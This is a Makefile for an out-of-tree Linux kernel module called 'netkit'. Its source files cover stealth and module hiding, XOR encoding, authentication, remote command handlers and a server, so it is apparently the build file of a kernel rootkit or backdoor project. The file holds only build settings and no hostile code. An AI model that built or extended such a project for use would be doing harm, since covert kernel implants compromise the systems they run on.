# Makefile for the external kernel module

# Set the name of your module
MODULE_NAME := netkit

# Set the list of source files
SRC_FILES += src/netkit.c
SRC_FILES += src/core/iface.c src/core/auth/auth.c src/core/auth/handlers.c src/core/cmd/cmd.c src/core/cmd/handlers.c src/core/packet/packet.c
SRC_FILES += src/encoding/iface.c src/encoding/xor/xor.c
SRC_FILES += src/io/iface.c src/io/server/server.c
SRC_FILES += src/stealth/iface.c src/stealth/module/module.c
SRC_FILES += src/sys/file.c src/sys/mem.c src/sys/socket.c src/sys/symbol.c src/sys/task.c

# Set the list of header files
#HEADER_FILES := $(wildcard *.h)

# Set the kernel build directory
KERNEL_BUILD_DIR := /home/user/code/linux/linux-fixed-zdi-1

# Set the flags for the kernel build
EXTRA_CFLAGS := -Wall -I$(PWD)

obj-m := $(MODULE_NAME).o
$(MODULE_NAME)-objs := $(SRC_FILES:.c=.o)

all:
	make -C $(KERNEL_BUILD_DIR) M=$(PWD) modules
clean:
	make -C $(KERNEL_BUILD_DIR) M=$(PWD) clean

.PHONY: all clean
